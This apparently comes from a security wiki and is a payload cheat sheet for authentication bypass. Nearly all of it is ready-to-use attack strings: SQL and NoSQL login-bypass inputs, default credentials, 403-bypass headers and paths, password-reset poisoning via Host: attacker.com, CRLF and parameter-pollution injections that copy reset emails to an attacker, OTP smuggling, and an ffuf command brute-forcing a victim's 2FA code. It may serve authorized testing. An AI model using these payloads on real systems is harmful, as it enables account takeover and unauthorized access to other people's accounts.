---
title: "Payloads: Authentication Bypass"
type: payloads
tags: [payloads, authentication, bypass, 2fa, web]
sources: [hacktricks-web]
date_created: 2026-06-16
date_updated: 2026-07-14
---

# Payloads: Authentication Bypass

Login, MFA, and access-control bypass primitives. Routed via the `hunt-auth` skill. See [[authentication-attacks]], [[access-control]]; tokens -> [[jwt-attacks]].

## SQL / NoSQL login bypass
```
admin' --        admin'#        admin'/*        ' or 1=1 --        ') or ('1'='1
{"username":{"$ne":null},"password":{"$ne":null}}      # NoSQL, see [[nosql]]
```

## Default / weak creds (check first)
```
admin:admin  admin:password  root:root  admin:<blank>  guest:guest
# product defaults -> wiki/cheatsheets/default-credentials.md
```

## Response / logic manipulation
```
{"success":false}  -> {"success":true}        # tamper the auth response
HTTP 302 -> read the body of the "denied" 200; force 200 with X-Forwarded-* 
remove the MFA step / replay the pre-MFA session cookie
2FA: brute 000000-999999 (no rate limit); reuse one OTP; null/empty code; race the verify
```

## Authorization bypass (403/401 -> 200)
```
/admin            -> /admin/   /admin/.   /admin..;/   /Admin   /%2e/admin   //admin
X-Original-URL: /admin     X-Rewrite-URL: /admin     X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1   X-Forwarded-Host: localhost   Referer: https://target/admin
verb tamper: GET->POST/PUT/HEAD/TRACE/PATCH ;  /api/v1->/api/v2
```

## Password reset / takeover (see [[account-takeover]])
```
Host: attacker.com         X-Forwarded-Host: attacker.com      # reset poisoning
email=victim@x.com&email=attacker@x.com                        # param pollution
token: guessable/sequential/no-expiry/returned-in-JSON
```

## OAuth / JWT / SAML
```
JWT: alg:none ; weak HS256 secret crack ; kid path/SQLi ; jku/x5u SSRF   (see [[jwt]])
OAuth redirect_uri + SAML XSW -> [[oauth-saml]]
```

## OTP multi-value smuggling + email param pollution
OTP/verification multi-value smuggling (backend verifies if ANY submitted code matches):
```
code=000000&code=123456
{"code":["000000","123456"]}
otp=000000&one_time_code=123456
code=000000,123456        code=000000|123456
```
Parallel guessing to beat sequential lockout (Turbo Intruder, 30 conns), plus IP/header rotation:
```bash
ffuf -w codes.txt -u https://t/api/verify -X POST -H 'Content-Type: application/json' \
  -d '{"email":"victim@x.com","code":"FUZZ"}' -fr 'Invalid|Too many attempts' -mc all
```
Password-reset / change email via email-parameter injection (send to attacker too):
```
email=victim@mail.com&email=hacker@mail.com
{"email":["victim@mail.com","hacker@mail.com"]}
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com
email=victim@mail.com,hacker@mail.com     email=victim@mail.com|hacker@mail.com
```
Duplicate-registration / uniqueness bypass:
```
victim+1@gmail.com   v.ic.tim@gmail.com   Victim@x.com(case)   test@test.com<space>
victim@gmail.com@attacker.com   victim@attacker.com@gmail.com   victim%00@x.com   victim­@x.com
```
Registration-as-reset upsert ATO: `POST /.../doRegistrationEntries {"email":"victim@x.com","password":"New@1"}`.

## Real-world
`X-Original-URL`/`X-Custom-IP-Authorization` ACL bypass, response-flag tampering, OTP no-rate-limit, and reset poisoning are recurring high-bounty ATOs.
